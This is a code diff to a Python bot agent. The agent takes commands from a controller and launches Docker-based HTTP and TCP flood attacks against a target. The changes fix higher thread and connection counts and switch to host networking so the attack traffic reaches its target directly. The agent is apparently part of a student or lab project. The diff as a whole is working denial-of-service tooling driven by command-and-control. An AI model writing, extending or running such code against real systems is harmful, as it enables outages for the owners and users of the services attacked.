@@ -11,6 +11,10 @@ CONTROLLER_HOST = "localhost"
 CONTROLLER_PORT = 8545
 RECONNECT_DELAY = 5
 
+HTTP_THREADS = 6       # Fixed number of threads for HTTP attacks
+HTTP_CONNECTIONS = 150 # Fixed number of connections for HTTP attacks
+TCP_PARALLEL = 10 
+
 ATTACK_CONTAINERS = {
     "http": "fyp/http-attacker",
     "tcp": "fyp/tcp-attacker"
@@ -38,12 +42,13 @@ def connect_to_controller():
             print(f"Connection error: {e}")
             time.sleep(RECONNECT_DELAY)
 
-def launch_http_attack(target, duration, threads=2, connections=10):
+def launch_http_attack(target, duration):
     docker_cmd = [
         find_docker(), "run", "--rm", "-d",
+        "--network=host",  # Use host networking for direct access
         ATTACK_CONTAINERS["http"],
-        "-t", str(threads),
-        "-c", str(connections),
+        "-t", str(HTTP_THREADS),
+        "-c", str(HTTP_CONNECTIONS),
         "-d", str(duration),
         target
     ]
@@ -66,6 +71,7 @@ def launch_tcp_attack(target, duration):
     
     docker_cmd = [
         find_docker(), "run", "--rm", "-d",
+        "--network=host",  # Use host networking for direct access
         ATTACK_CONTAINERS["tcp"],
         "-t", str(duration),
         "-p", port,
@@ -139,9 +145,7 @@ def main():
                         continue
                     
                     if attack_type == "http":
-                        threads = command.get("threads", 2)
-                        connections = command.get("connections", 10)
-                        current_container = launch_http_attack(target, duration, threads, connections)
+                        current_container = launch_http_attack(target, duration)
                     elif attack_type == "tcp":
                         current_container = launch_tcp_attack(target, duration)
                     else:
